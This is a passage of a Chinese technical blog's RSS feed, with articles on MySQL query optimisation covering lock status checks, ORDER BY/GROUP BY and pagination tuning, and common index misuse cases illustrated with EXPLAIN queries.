&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">show&lt;/span> status &lt;span style="color:#66d9ef">like&lt;/span> &lt;span style="color:#e6db74">&amp;#34;innodb_row_lock%&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果锁竞争严重，innoDB_row_lock_waits 和 innoDB_row_lock_time_avg 的值比较高，则通过 information_schema 数据库中的表来查看锁情况。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> information_schema.innodb_locks
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/abp1qsmsx3no8ou8i6huk1b5/image_1bjcd4j8t8vm1nh51ohn1g9c13chb8.png" alt="image_1bjcd4j8t8vm1nh51ohn1g9c13chb8.png-60kB">&lt;/p>
&lt;h2 id="结语">结语&lt;/h2>
&lt;p>大型 web 应用通常都离不开数据库，而现代工程的性能瓶颈往往都在 IO 处理上。若想在面临 IO 处理时作出最佳实践，就应该建立全面的数据库应用知识体系。&lt;/p>
&lt;hr>
&lt;p>&lt;em>参考书籍&lt;/em>
&lt;em>《深入浅出 mysql》&lt;/em>&lt;/p></description></item><item><title>索引的优化技巧</title><link>https://www.chucklin.net/post/index_tips/</link><pubDate>Sun, 23 Feb 2020 09:52:00 +0800</pubDate><guid>https://www.chucklin.net/post/index_tips/</guid><description>&lt;h2 id="优化-order-by-语句">优化 Order by 语句&lt;/h2>
&lt;p>众所周知，针对大量数据进行排序费时费力。了解 Mysql 的排序方式是优化数据库排序性能的充分条件。&lt;/p>
&lt;h3 id="索引顺序扫描">索引顺序扫描&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">show&lt;/span> &lt;span style="color:#66d9ef">index&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> test_index_table
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/bf4ifvp3ybv0zx3w6wn6wdt3/image_1bhd1bbnb91v1hn1fsq1e2e589.png" alt="image_1bhd1bbnb91v1hn1fsq1e2e589.png-63.9kB">&lt;/p>
&lt;p>在 test_index_table 上我们创建了 3 个索引。Btree 索引的实现原理决定了索引的数据一定是顺序排列的。如果查询语句能够遵循索引数据本身的排列数据进行检索的话，则 mysql 不需要额外的排序工作，操作效率极高。查询类型显示为 Using index。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> age &lt;span style="color:#66d9ef">FROM&lt;/span> test.test_index_table &lt;span style="color:#66d9ef">where&lt;/span> age &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;26&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">order&lt;/span> &lt;span style="color:#66d9ef">by&lt;/span> age
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/lu0dbk9im9j3dzwcybrtveos/image_1bhd1paf01a7ed63slho0qcem.png" alt="image_1bhd1paf01a7ed63slho0qcem.png-50.2kB">&lt;/p>
&lt;h3 id="filesort-排序">filesort 排序&lt;/h3>
&lt;p>若碰巧你无法使用索引覆盖扫描，mysql 会将取得的数据在内存中，或者硬盘上对数据进行分块后排序。由于多了一次排序工作，处理效率相比索引覆盖扫描自然就大打折扣了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> age &lt;span style="color:#66d9ef">FROM&lt;/span> test.test_index_table &lt;span style="color:#66d9ef">where&lt;/span> age &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;26&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">order&lt;/span> &lt;span style="color:#66d9ef">by&lt;/span> id
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/93spq2fq4dvpjrwi562vhal7/image_1bhd2pcv7qpi1qa72jd12831ukl13.png" alt="image_1bhd2pcv7qpi1qa72jd12831ukl13.png-53.4kB">
上面的查询虽然使用了索引作为查询条件，但是却选择了采用 id 作为排序规则进行排序。
根据 age 与根据 id 对应的索引进行排序的结果显然不同，所以 mysql 选择了 Using index 后再进行 Using where 回表扫描后对取出的数据进行排序，增加了数据库负担。&lt;/p>
&lt;h3 id="复合索引的顺序扫描">复合索引的顺序扫描&lt;/h3>
&lt;p>如果你的索引为复合索引，这个问题将变的较为复杂一些。如下表中有 NAME_ADDESS 复合索引。
&lt;img src="http://static.zybuluo.com/mikumikulch/x3k5lm48scquuuarg622i7y9/image_1bhd338e6djrvd01idsvu51v151g.png" alt="image_1bhd338e6djrvd01idsvu51v151g.png-45.7kB"> 数据按照 name、address 的顺序进行排序。&lt;/p>
&lt;h4 id="复合索引索引覆盖查询">复合索引索引覆盖查询&lt;/h4>
&lt;p>排序条件为 name 时，成功利用索引优化性能&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> name &lt;span style="color:#66d9ef">FROM&lt;/span> test.test_index_table &lt;span style="color:#66d9ef">where&lt;/span> name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39; 张三&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">order&lt;/span> &lt;span style="color:#66d9ef">by&lt;/span> name
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/goe5asm6o973zgs9qivli4pz/image_1bhd3s5nv178rm7i1ld3tk21cl11t.png" alt="image_1bhd3s5nv178rm7i1ld3tk21cl11t.png-52.1kB">&lt;/p>
&lt;h4 id="复合索引回表扫描查询">复合索引回表扫描查询&lt;/h4>
&lt;p>排序条件与索引不相同时，查询类型变为回表扫描。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> name &lt;span style="color:#66d9ef">FROM&lt;/span> test.test_index_table &lt;span style="color:#66d9ef">where&lt;/span> name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39; 张三&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">order&lt;/span> &lt;span style="color:#66d9ef">by&lt;/span> address
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/eb4y309eybycpzqckwzipu2c/image_1bhd3vsu2k261o45ct919j317lv2a.png" alt="image_1bhd3vsu2k261o45ct919j317lv2a.png-54.8kB">
可见，尽量减少额外的排序，通过索引直接返回有序的数据，是优化 Mysql 排序的关键所在。&lt;/p>
&lt;h2 id="优化-group-by-语句">优化 Group By 语句&lt;/h2>
&lt;p>即使你没有显示的指定 order by 语句，mysql 在默认情况下会多所有 Group By col1，col2 的字段进行排序。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">FROM&lt;/span> test_index_table &lt;span style="color:#66d9ef">group&lt;/span> &lt;span style="color:#66d9ef">by&lt;/span> age
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/llkjyfplzuxj74divd2ejs52/image_1bhfmijtb10ak1bepsq0dakedm.png" alt="image_1bhfmijtb10ak1bepsq0dakedm.png-50.3kB">&lt;/p>
&lt;p>如果想要避免排序结果产生的消耗，则可以指定 order by null 禁止排序&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">FROM&lt;/span> test_index_table &lt;span style="color:#66d9ef">group&lt;/span> &lt;span style="color:#66d9ef">by&lt;/span> age &lt;span style="color:#66d9ef">order&lt;/span> &lt;span style="color:#66d9ef">by&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/lj8ue1r5q3nfmvcca8fvu8z8/image_1bhfmk2jl18ubrpohovrip1kuf13.png" alt="image_1bhfmk2jl18ubrpohovrip1kuf13.png-49kB">&lt;/p>
&lt;h2 id="优化-or-条件">优化 OR 条件&lt;/h2>
&lt;p>含有 or 条件的查询语句，如果想要利用索引，则 or 之前的每个条件列都必须要用到对应的索引。mysql 在处理含有 or 语句的查询时，会对 or 的各个字段分别查询后的结果进行 UNION。&lt;/p>
&lt;h2 id="优化分页查询">优化分页查询&lt;/h2>
&lt;p>类似&amp;quot;limit 1000,20&amp;quot;是相当常见的分页请求。mysql 在处理此类排序时会查询出 1020 条记录，然后舍弃掉前 1000 条数据，代价较高。所以在进行一般分页查询时候，在索引上完成排序分页的操作。尽量减少 mysql 排序时操作的数据量，是一种较为通用的优化思路。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">FROM&lt;/span> test.test_index_table &lt;span style="color:#66d9ef">order&lt;/span> &lt;span style="color:#66d9ef">by&lt;/span> age &lt;span style="color:#66d9ef">limit&lt;/span> &lt;span style="color:#ae81ff">10000&lt;/span>,&lt;span style="color:#ae81ff">20&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/76xzm5psgz9f31ygbjpfsv56/image_1bhkmer3lr4q1ila1tapg3d1g2l9.png" alt="image_1bhkmer3lr4q1ila1tapg3d1g2l9.png-51kB">&lt;/p>
&lt;p>在数据量巨大的表中使用 limit 分页是相当可怕的一件事情。针对这样的处理，我们就可以按照覆盖索引的方式尽量减少排序时 mysql 操作的数据量。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> test_index_table a &lt;span style="color:#66d9ef">inner&lt;/span> &lt;span style="color:#66d9ef">join&lt;/span> (&lt;span style="color:#66d9ef">SELECT&lt;/span> id &lt;span style="color:#66d9ef">FROM&lt;/span> test.test_index_table &lt;span style="color:#66d9ef">order&lt;/span> &lt;span style="color:#66d9ef">by&lt;/span> id &lt;span style="color:#66d9ef">limit&lt;/span> &lt;span style="color:#ae81ff">10000&lt;/span>,&lt;span style="color:#ae81ff">20&lt;/span>) b
&lt;span style="color:#66d9ef">on&lt;/span> a.id &lt;span style="color:#f92672">=&lt;/span> b.id
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/pkoun1q19wbxccetkfwhk8lb/image_1bhknak3k1ion1uas1iuk610lej13.png" alt="image_1bhknak3k1ion1uas1iuk610lej13.png-69.2kB">&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>本问提及的优化手段虽然十分浅显，但是却至关重要。一个 web 工程大部分的性能问题都是由 database IO 引起的。对 SQL 语句进行适当的合理优化能够解决一个 web 工程 80%的性能问题。&lt;/p></description></item><item><title>索引的使用误区</title><link>https://www.chucklin.net/post/index_badusage/</link><pubDate>Sun, 23 Feb 2020 09:52:00 +0800</pubDate><guid>https://www.chucklin.net/post/index_badusage/</guid><description>&lt;p>回顾上一章的内容，除了介绍了基本的使用索引优化 sql 语句的基本手法以外，还提到了滥用索引会引起性能恶化的问题。本章节的内容将会举例说明哪些场景的索引属于滥用，以及如何避免索引的误用。&lt;/p>
&lt;h2 id="索引的滥用">索引的滥用&lt;/h2>
&lt;p>为了优化 sql 语句的执行效率，我们往往会给表中加上各种各样的索引。
但是在某些场景下索引不仅无法被用来提升效率，还会增加表空间占用，延长 modify 方法的执行时间。
下面是一些存在索引但无法使用的典型场景。&lt;/p>
&lt;h3 id="以开头的-like-查询">以%开头的 Like 查询&lt;/h3>
&lt;p>在上一章的内容中我们已经有所体会不遵循左前缀原则的查询统统无法使用 B-tree 索引。
那么针对 %Like 的查询我们有什么优化手段呢？来看下面这个例子：&lt;/p>
&lt;p>表 test_index_table 拥有联合索引 NAME_ADDRESS 如下：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">CREATE&lt;/span> &lt;span style="color:#66d9ef">TABLE&lt;/span> &lt;span style="color:#f92672">`&lt;/span>test_index_table&lt;span style="color:#f92672">`&lt;/span> (
&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span> int(&lt;span style="color:#ae81ff">11&lt;/span>) &lt;span style="color:#66d9ef">NOT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span> AUTO_INCREMENT,
&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>birthday&lt;span style="color:#f92672">`&lt;/span> datetime &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>address&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>phone&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>note&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>age&lt;span style="color:#f92672">`&lt;/span> int(&lt;span style="color:#ae81ff">11&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#66d9ef">PRIMARY&lt;/span> &lt;span style="color:#66d9ef">KEY&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span>),
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>NAME_ADDRESS&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span>,&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE
) ENGINE&lt;span style="color:#f92672">=&lt;/span>InnoDB AUTO_INCREMENT&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">283&lt;/span> &lt;span style="color:#66d9ef">DEFAULT&lt;/span> CHARSET&lt;span style="color:#f92672">=&lt;/span>utf8
&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>有一种轻量级的解决方式为，利用索引比表小，扫描索引比扫描全表更快的原理，通过模糊匹配查询出符合条件的索引列表，之后再根据查询出的索引列表，回表进行连表检索。这样就能避免全表扫描时产生的大量 IO 请求。
&lt;/code>&lt;/pre>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">from&lt;/span> (&lt;span style="color:#66d9ef">select&lt;/span> id &lt;span style="color:#66d9ef">from&lt;/span> test_index_table &lt;span style="color:#66d9ef">where&lt;/span> name &lt;span style="color:#66d9ef">like&lt;/span> &lt;span style="color:#e6db74">&amp;#39;%四&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> a, test_index_table &lt;span style="color:#66d9ef">as&lt;/span> b
&lt;span style="color:#66d9ef">where&lt;/span> a.id &lt;span style="color:#f92672">=&lt;/span> b.id
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/uaxvgl9u59jcuzc33m94i8m0/image_1bj0kbioikli17lo1o1tuid7pl9.png" alt="image_1bj0kbioikli17lo1o1tuid7pl9.png-96.8kB">&lt;/p>
&lt;pre>&lt;code>内层的子查询的 Using index 代表索引覆盖扫描。扫描出来的 id 与外表做关联，再查出相应的结果。
&lt;/code>&lt;/pre>
&lt;p>从结果分析可以看出两个 Sql 都利用了索引，所以理论上要比直接使用 name 来做全表扫描更快一些。&lt;/p>
&lt;h3 id="数据类型出现隐式转换时也不会使用索引">数据类型出现隐式转换时也不会使用索引&lt;/h3>
&lt;p>让我们对上一个例子中的表增加一个 AGE 索引。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">CREATE&lt;/span> &lt;span style="color:#66d9ef">TABLE&lt;/span> &lt;span style="color:#f92672">`&lt;/span>test_index_table&lt;span style="color:#f92672">`&lt;/span> (
&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span> int(&lt;span style="color:#ae81ff">11&lt;/span>) &lt;span style="color:#66d9ef">NOT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span> AUTO_INCREMENT,
&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>birthday&lt;span style="color:#f92672">`&lt;/span> datetime &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>address&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>phone&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>note&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">45&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#f92672">`&lt;/span>age&lt;span style="color:#f92672">`&lt;/span> varchar(&lt;span style="color:#ae81ff">11&lt;/span>) &lt;span style="color:#66d9ef">DEFAULT&lt;/span> &lt;span style="color:#66d9ef">NULL&lt;/span>,
&lt;span style="color:#66d9ef">PRIMARY&lt;/span> &lt;span style="color:#66d9ef">KEY&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span>),
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>NAME_ADDRESS&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>name&lt;span style="color:#f92672">`&lt;/span>,&lt;span style="color:#f92672">`&lt;/span>id&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE,
&lt;span style="color:#66d9ef">KEY&lt;/span> &lt;span style="color:#f92672">`&lt;/span>AGE&lt;span style="color:#f92672">`&lt;/span> (&lt;span style="color:#f92672">`&lt;/span>age&lt;span style="color:#f92672">`&lt;/span>) &lt;span style="color:#66d9ef">USING&lt;/span> BTREE
) ENGINE&lt;span style="color:#f92672">=&lt;/span>InnoDB AUTO_INCREMENT&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">283&lt;/span> &lt;span style="color:#66d9ef">DEFAULT&lt;/span> CHARSET&lt;span style="color:#f92672">=&lt;/span>utf8
&lt;/code>&lt;/pre>&lt;/div>&lt;p>尝试使用下面的 sql 语句进行查询&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">FROM&lt;/span> test.test_index_table &lt;span style="color:#66d9ef">where&lt;/span> age &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">26&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>由于表中的 age 是 VARCHAR 类型。而在 sql 语句中我们使用的是数字类型 26。MYSQL 默认会把输入的常量值进行转换以后才进行检索。现在我们通过 explain 看看这个语句的分析结果。
&lt;img src="http://static.zybuluo.com/mikumikulch/kvhx1z2hj5wt6a8e64zhvj0p/image_1bgr0r2s9inlnb7o71g30v79.png" alt="image_1bgr0r2s9inlnb7o71g30v79.png-43.5kB">
很遗憾，索引并没有起到相应的作用。分析结果当前查询执行了全表扫描。&lt;/p>
&lt;p>尝试将数字改为字符串重新执行 sql&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">FROM&lt;/span> test.test_index_table &lt;span style="color:#66d9ef">where&lt;/span> age &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">26&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/hdf0iuezwpfpktiw127i8hff/image_1bgr0uotkjd34hhj3a1lkc1ksr9.png" alt="image_1bgr0uotkjd34hhj3a1lkc1ksr9.png-29.9kB">
索引重新恢复了作用。可见，隐式的类型转换出现时，索引不会被使用。&lt;/p>
&lt;pre>&lt;code>并非所有的隐式类型转换都无法使用索引。当列为 int、而查询语句中的 age 为字符串时，索引照样能够被使用。你可以试试对上面表中的索引 id 列进行查询，证明这个结论。
&lt;/code>&lt;/pre>
&lt;h3 id="使用-or-分割条件时若-or-前的条件中的列有索引而后面的列中没有索引则前后涉及的索引都不会被用到">使用 or 分割条件时，若 or 前的条件中的列有索引，而后面的列中没有索引，则前后涉及的索引都不会被用到。&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">explain&lt;/span> &lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#66d9ef">FROM&lt;/span> test.test_index_table &lt;span style="color:#66d9ef">where&lt;/span> id &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;145&amp;#39;&lt;/span> &lt;span style="color:#66d9ef">or&lt;/span> address &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;北京&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/3we8nh5pni28clxayqvujuuo/image_1bgr1h59m1skq1e141054k911cim.png" alt="image_1bgr1h59m1skq1e141054k911cim.png-44.3kB">
由于 address 没有索引，所以后面的查询一定会通过全表扫描执行。在存在全表扫描的情况下，就没必要多一次索引扫描，增加 IO 访问了。&lt;/p>
&lt;h2 id="查看索引使用情况">查看索引使用情况&lt;/h2>
&lt;p>掌握了索引的正确使用方法后是不是有点跃跃欲试的感觉了？别着急， mysql 还提供了一个针对数据库的索引有效性分析工具。在尝试优化索引之前最好通过此工具对数据库目前的索引效率进行一个全面的大致了解。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">show&lt;/span> status &lt;span style="color:#66d9ef">like&lt;/span> &lt;span style="color:#e6db74">&amp;#39;handler_read%&amp;#39;&lt;/span>;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="http://static.zybuluo.com/mikumikulch/inaqs9cqp81ii5eqwcfdswfn/image_1bhcscfvtas9db6a1s1g3p1l8f9.png" alt="image_1bhcscfvtas9db6a1s1g3p1l8f9.png-49.6kB">&lt;/p>
&lt;p>Handler_read_key 的值代表了一个行被索引值读的次数。若值较高则意味着索引高效。若值较低则意味着增加索引所带来的性能改善不够理想。Handler_read_rnd_next 值的含义为：在数据文件中读取下一行的请求数。如果你的库进行了大量的全表扫描，则该值通常较高。这意味着查询运行的语句运行较为低效，应该马上建立索引进行补救。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>上面举例了三个有代表性的索引被误用的场景。建议在平时的工作与学习中，可以将比较具有代表性的索引使用与误用的场景都记下来，整理成前后连贯的文章以加深理解和方便日后进行查询与再利用。&lt;/p>
&lt;p>最后，索引在精不在多。对于某些经常被访问的查询我们可以尝试使用索引来优化执行效率。而对于某个速度很慢但是为系统管理员设计的查询，是否需要加上索引就需要结合实际情况判断了！&lt;/p>
&lt;hr>
&lt;p>&lt;em>参考书籍：&lt;/em>
&lt;em>《深入浅出 Mysql》&lt;/em>&lt;/p></description></item><item><title>索引的应用</title><link>https://www.chucklin.net/post/index_overview/</link><pubDate>Sat, 22 Feb 2020 09:52:00 +0800</pubDate><guid>https://www.chucklin.net/post/index_overview/</guid><description>&lt;p>接上一章，我们成功分析出了有问题的 sql 语句。接下来该针对问题语句进行更进一步的优化了。索引往往在这个时候被引入来解决 sql 的运行效率的问题。&lt;/p>
&lt;p>虽然索引的使用十分广泛，但是部分开发人员对索引的知识没有成体系的了解，造成了误用索引。误用索引不仅不能解决问题，还会进一步恶化性能。&lt;/p>
&lt;p>好消息是，过阅读索引相关的章节的内容你将掌握以下几个知识点，从而建立起正确运用索引的基本知识。&lt;/p>
&lt;ul>
&lt;li>索引是什么，都有哪些索引？&lt;/li>
&lt;li>与索引相关的术语的基本概念。&lt;/li>
&lt;li>哪些典型的场景能够使用索引？&lt;/li>
&lt;li>哪些典型的场景无法使用索引？&lt;/li>
&lt;/ul>
&lt;h2 id="索引是什么都有哪些索引">索引是什么？都有哪些索引？&lt;/h2>
&lt;p>和书本能够利用目录快速定位到具体内容一样，索引也能够快速查询到数据库表中的具体内容。索引就是数据库的目录。&lt;/p>
&lt;p>真正的索引是在 mysql 存储引擎中实现的。所以每种不同的存储引擎都对应了不同的索引类型。
常见的索引类型分为以下四种：&lt;/p>
&lt;ul>
&lt;li>B-tree 索引：最常见的索引类型&lt;/li>
&lt;li>Hash 索引：只有 Memory 引擎支持&lt;/li>
